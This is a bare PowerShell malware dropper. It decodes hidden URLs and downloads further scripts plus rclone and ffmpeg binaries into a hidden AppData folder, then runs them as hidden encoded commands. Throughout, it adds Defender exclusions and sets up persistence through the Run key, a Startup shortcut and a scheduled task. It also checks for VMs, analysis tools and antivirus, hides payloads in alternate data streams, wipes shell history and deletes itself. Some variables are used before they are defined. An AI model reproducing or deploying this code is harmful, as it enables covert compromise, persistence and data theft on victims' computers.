$ErrorActionPreference="Stop"
trap{continue}
function DoubleObfuscate($str, $key) {
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($str)
    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }
    $b64 = [Convert]::ToBase64String($bytes)
    [string]::Join('', [array]::Reverse($b64.ToCharArray()))
}
function DoubleDeobfuscate($obf, $key) {
    $arr = $obf.ToCharArray()
    [Array]::Reverse($arr)
    $b64 = -join $arr
    $bytes = [Convert]::FromBase64String($b64)
    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }
    [System.Text.Encoding]::Unicode.GetString($bytes)
}
function JunkCode {
    $junkArr = @(Get-Random, [guid]::NewGuid().ToString(), (Get-Date).Ticks)
    $junkSum = ($junkArr | Measure-Object -Sum).Sum
    if ($junkSum -gt 100000) { Write-Verbose $junkSum }
    $junkSleep = Get-Random -Minimum 10 -Maximum 100
    Start-Sleep -Milliseconds $junkSleep
}
JunkCode

$key = Get-Random -Minimum 1 -Maximum 255
$obfUrls = @(
    DoubleObfuscate('aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A', $key),
    DoubleObfuscate('aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA==', $key)
)
function d($s,$k){ DoubleDeobfuscate($s,$k) | % {$_} }
$repo='https://'+(d($obfUrls[0],$key) -replace '(.)',{param($c)[char]([byte][char]$c -bxor 1)}) -replace '[^\w\.\/\-]',''
$gh='https://'+(d($obfUrls[1],$key) -replace '(.)',{param($c)[char]([byte][char]$c -bxor 1)}) -replace '[^\w\.\/\-]',''
$dest=Join-Path $env:APPDATA ('Microsoft\Windows\'+([guid]::NewGuid().Guid.Substring(0,8)))
$localVersion=DoubleObfuscate("1.0.0",$key)
$mainScript=DoubleObfuscate("A.ps1",$key)
$files=@(
    DoubleObfuscate("system_cache.ps1",$key),
    DoubleObfuscate("rclone.exe",$key),
    DoubleObfuscate("rclone.conf",$key),
    DoubleObfuscate("ffmpeg.exe",$key),
    DoubleObfuscate("setup.vbs",$key),
    DoubleObfuscate("TaskService.vbs",$key)
)
try{
    $remote=Invoke-WebRequest "$repo/version.txt" -UseBasicParsing -TimeoutSec 5
    if($remote.Content.Trim() -ne $localVersion){
        $tmp=Join-Path $env:TEMP $mainScript
        Invoke-WebRequest "$repo/$mainScript" -OutFile $tmp -TimeoutSec 10
        $encoded=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`""))
        Start-Process -FilePath powershell -ArgumentList "-EncodedCommand $encoded" -WindowStyle Hidden
        exit
    }
}catch{}
if(-not(Test-Path $dest)){New-Item -ItemType Directory -Path $dest -Force|Out-Null}
try{attrib +h $dest}catch{}

$neededFiles = @(
    DoubleObfuscate("system_cache.ps1",$key),
    DoubleObfuscate("rclone.exe",$key),
    DoubleObfuscate("rclone.conf",$key),
    DoubleObfuscate("ffmpeg.exe",$key)
)
$useVbsAutostart = $true
if ($useVbsAutostart) {
    $neededFiles += DoubleObfuscate("setup.vbs",$key)
    $neededFiles += DoubleObfuscate("TaskService.vbs",$key)
}

$randomFiles = @{}
foreach ($f in $neededFiles) {
    $ext = [System.IO.Path]::GetExtension(DoubleDeobfuscate($f,$key))
    $randomFiles[$f] = [guid]::NewGuid().Guid.Substring(0,8) + $ext
}
foreach($f in $neededFiles){
    $t=Join-Path $dest $randomFiles[$f]
    if(-not(Test-Path $t)){
        try{
            $orig = DoubleDeobfuscate($f,$key)
            if($orig -eq "ffmpeg.exe" -or $orig -eq "rclone.exe"){
                Invoke-WebRequest "$gh/$orig" -OutFile $t -TimeoutSec (Get-Random -Minimum 10 -Maximum 30)
            }else{
                Invoke-WebRequest "$repo/$orig" -OutFile $t -UseBasicParsing -TimeoutSec (Get-Random -Minimum 5 -Maximum 15)
            }
            Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 1000)
        }catch{}
    }
}
$exeFiles = @(
    DoubleObfuscate("ffmpeg.exe",$key),
    DoubleObfuscate("rclone.exe",$key)
)
$exeRandomPaths = $exeFiles | ForEach-Object { Join-Path $dest $randomFiles[$_] }
$start = Get-Date
while ($true) {
    $missing = $exeRandomPaths | Where-Object { -not (Test-Path $_) }
    if ($missing.Count -eq 0) { break }
    if ((Get-Date) - $start -gt (New-TimeSpan -Seconds (Get-Random -Minimum 60 -Maximum 180))) {
        throw "Timeout waiting for exe files: $($missing -join ', ')"
    }
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
}
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 120)

$scps1 = Join-Path $dest $randomFiles[DoubleObfuscate("system_cache.ps1",$key)]
if (Test-Path $scps1) {
    try {
        $memScript = Get-Content $scps1 -Raw
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($memScript))
        powershell -EncodedCommand $encoded
    } catch {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scps1`""
    }
}

function Test-Admin{
    $id=[Security.Principal.WindowsIdentity]::GetCurrent()
    $p=New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if(Test-Admin){
    try{
        Set-MpPreference -ExclusionPath $dest
        Set-MpPreference -ExclusionProcess "$dest\$($randomFiles[DoubleObfuscate('system_cache.ps1',$key)])"
        Set-MpPreference -ExclusionProcess "$dest\$($randomFiles[DoubleObfuscate('ffmpeg.exe',$key)])"
        Set-MpPreference -ExclusionProcess "$dest\$($randomFiles[DoubleObfuscate('rclone.exe',$key)])"
    }catch{}
}

try{
    $runPath = "$dest\$($randomFiles[DoubleObfuscate('system_cache.ps1',$key)])"
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCache" -Value "`"$runPath`""
    $sh=New-Object -ComObject WScript.Shell
    $lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$([guid]::NewGuid().Guid.Substring(0,8)).lnk"
    $sc=$sh.CreateShortcut($lnk)
    $sc.TargetPath="powershell.exe"
    $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runPath`""
    $sc.WorkingDirectory=$dest
    $sc.Save()
    $action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runPath`""
    $trigger=New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "SysCacheUpd" -Action $action -Trigger $trigger -Force
}catch{}

Start-Job{
    $f="$dest\$($randomFiles[DoubleObfuscate('A.ps1',$key)])"
    $src="$repo/A.ps1"
    while($true){
        if(-not(Test-Path $f)){
            try{Invoke-WebRequest $src -OutFile $f -UseBasicParsing}catch{}
        }
        Start-Sleep -Seconds (Get-Random -Minimum 180 -Maximum 600)
    }
}|Out-Null

try {
    $vmSigns = @("VBOX", "VMWARE", "QEMU", "KVM", "XEN", "VIRTUAL")
    $sysInfo = "$env:COMPUTERNAME $env:USERNAME $(Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)"
    foreach ($sign in $vmSigns) {
        if ($sysInfo.ToUpper().Contains($sign)) { exit }
    }
} catch {}

try {
    $wmiHide = DoubleDeobfuscate(DoubleObfuscate("Get-WmiObject Win32_Process | Where-Object { $_.Name -eq 'powershell.exe' } | ForEach-Object { $_.Hide() }", 0x42), 0x42)
    Invoke-Expression $wmiHide
} catch {}

try {
    $adsTarget = "$dest\$([guid]::NewGuid().Guid.Substring(0,8)).txt"
    " " | Set-Content -Path $adsTarget -Encoding ASCII
    $adsStream = "$adsTarget:$(DoubleObfuscate('hidden.ps1', $key))"
    Copy-Item -Path $me -Destination $adsStream -Force
    attrib +s +h $adsStream
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$adsStream`""
} catch {}

for ($i=0; $i -lt (Get-Random -Minimum 3 -Maximum 8); $i++) {
    $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
    Set-Variable -Name $junkVar -Value ([guid]::NewGuid().ToString() + (Get-Random))
    Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 200)
}
for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 4); $i++) {
    $fname = "junkFunc" + [guid]::NewGuid().Guid.Substring(0,8)
    Set-Item -Path "function:$fname" -Value { param($x) return ($x + (Get-Random -Minimum 1 -Maximum 100)) }
}
for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
    $junkFile = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
    Set-Content -Path $junkFile -Value ("JUNK" + [guid]::NewGuid().ToString()) -Encoding ASCII
}

if ((Get-Random) % 2 -eq 0) {
    Write-Output ("Fake log: " + (Get-Date))
    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
}

$me=$MyInvocation.MyCommand.Path
$bat="$env:TEMP\$([guid]::NewGuid().Guid.Substring(0,8)).bat"
Set-Content -Path $bat -Value "@echo off`r`n:loop`r`ndel `"$me`"`r`nif exist `"$me`" goto loop`r`ndel %0" -Encoding ASCII
Start-Process -WindowStyle Hidden -FilePath $bat

for ($i=0; $i -lt (Get-Random -Minimum 5 -Maximum 15); $i++) {
    $junk = [guid]::NewGuid().ToString() + (Get-Random)
}

Remove-Variable -Name key, obfUrls, repo, gh, dest, localVersion, mainScript, neededFiles, randomFiles, exeFiles, exeRandomPaths, scps1, runPath -ErrorAction SilentlyContinue

$analysisTools = @("procmon.exe","wireshark.exe","fiddler.exe","procexp.exe","tcpview.exe","ollydbg.exe","x64dbg.exe")
try {
    $procs = Get-Process | Select-Object -ExpandProperty ProcessName
    foreach ($tool in $analysisTools) {
        if ($procs -contains ($tool -replace ".exe","")) { exit }
    }
} catch {}

try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
} catch {}

try {
    Start-Process calc.exe -WindowStyle Hidden
    Start-Process notepad.exe -WindowStyle Hidden
} catch {}

for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 6); $i++) {
    Write-Error ("Random error: " + [guid]::NewGuid().ToString())
    Write-Output ("Random log: " + (Get-Random))
}

$avListObf = @(
    DoubleObfuscate("MsMpEng",$key), DoubleObfuscate("avp",$key), DoubleObfuscate("avg",$key),
    DoubleObfuscate("avast",$key), DoubleObfuscate("mcshield",$key), DoubleObfuscate("clamwin",$key),
    DoubleObfuscate("savservice",$key), DoubleObfuscate("wrsa",$key), DoubleObfuscate("f-secure",$key),
    DoubleObfuscate("egui",$key), DoubleObfuscate("ekrn",$key), DoubleObfuscate("nod32",$key),
    DoubleObfuscate("kaspersky",$key), DoubleObfuscate("sophos",$key), DoubleObfuscate("trend",$key),
    DoubleObfuscate("symantec",$key), DoubleObfuscate("defender",$key)
)
$avProcs = $avListObf | ForEach-Object { DoubleDeobfuscate($_, $key) }

try {
    $wmiProcs = Get-WmiObject Win32_Process | Select-Object -Property Name, CommandLine, ExecutablePath
    foreach ($av in $avProcs) {
        if ($wmiProcs | Where-Object { $_.Name -like "*$av*" -or $_.CommandLine -like "*$av*" -or $_.ExecutablePath -like "*$av*" }) {
            Handle-AVDetection
        }
    }
} catch {}

$legitContents = @("MZ", "PK", "This program cannot be run in DOS mode.", "SQLite format 3", "RIFF", "GIF89a")
for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
    $junkFile = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
    $content = $legitContents | Get-Random
    Set-Content -Path $junkFile -Value $content -Encoding ASCII
}

try {
    $adsExeTarget = "$dest\$([guid]::NewGuid().Guid.Substring(0,8)).txt"
    " " | Set-Content -Path $adsExeTarget -Encoding ASCII
    $adsExeStream = "$adsExeTarget:renamer.exe"
    Copy-Item -Path $renamerExePath -Destination $adsExeStream -Force
    attrib +s +h $adsExeStream
    Start-Process -FilePath $adsExeStream -ArgumentList ([guid]::NewGuid().ToString()) -WindowStyle Hidden
} catch {}

for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 4); $i++) {
    try {
        $arg = ("junk_" + [guid]::NewGuid().Guid.Substring(0,8))
        Start-Process -FilePath $renamerExePath -ArgumentList $arg -WindowStyle Hidden
    } catch {}
}

$renamerExeName = [guid]::NewGuid().Guid.Substring(0,8) + ".exe"
$renamerExePath = Join-Path $dest $renamerExeName
$renamerCsPath = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".cs")
$renamerUrl = "$repo/ProcessRenamer.exe"
$renamerCsUrl = "$repo/ProcessRenamer.cs"
if (-not (Test-Path $renamerExePath)) {
    try {
        Invoke-WebRequest $renamerCsUrl -OutFile $renamerCsPath -UseBasicParsing -TimeoutSec 10
        $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        if (Test-Path $csc) {
            & $csc /target:exe /out:$renamerExePath $renamerCsPath
        }
        if (-not (Test-Path $renamerExePath)) {
            Invoke-WebRequest $renamerUrl -OutFile $renamerExePath -UseBasicParsing -TimeoutSec 10
        }
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
    } catch {}
}

for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
    $fakeCs = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".cs")
    Set-Content -Path $fakeCs -Value "// junk file $(Get-Random)" -Encoding ASCII
    try {
        $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        if (Test-Path $csc) {
            & $csc /target:exe /out:($fakeCs + ".exe") $fakeCs
        }
    } catch {}
}

try {
    Get-ChildItem -Path $dest -Filter *.tmp -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
} catch {}

function Handle-AVDetection {
    $behaviors = @("exit", "sleep", "error", "cleanup", "noop")
    $choice = $behaviors | Get-Random
    switch ($choice) {
        "exit"    { exit }
        "sleep"   { while ($true) { Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 300) } }
        "error"   { for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) { Write-Error "Fake critical error: $([guid]::NewGuid())"; Start-Sleep -Seconds 1 } }
        "cleanup" {
            try {
                Get-ChildItem -Path $dest -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
            } catch {}
            exit
        }
        "noop" { Write-Output "No operation performed." }
    }
}